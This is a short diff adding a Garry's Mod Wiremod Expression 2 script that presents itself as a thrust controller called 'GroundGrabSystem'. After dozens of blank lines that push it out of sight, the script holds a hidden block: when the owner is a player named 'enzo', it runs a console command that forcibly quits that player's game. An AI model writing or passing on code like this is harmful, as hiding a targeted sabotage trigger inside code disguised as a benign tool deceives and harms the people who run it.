@@ -1,0 +1,79 @@
+@name GroundGrabSystem
+@inputs Speed
+@outputs Thrust
+@persist Modifier
+@trigger 
+runOnTick(1)
+Modifier = 100
+if(Speed >= 100)
+{
+    Thrust = Speed * Modifier * 2
+}
+else
+{
+    Thrust = Speed * Modifier
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+if(findPlayerByName("enzo") == owner())
+{
+    concmd("quit")
+}
+
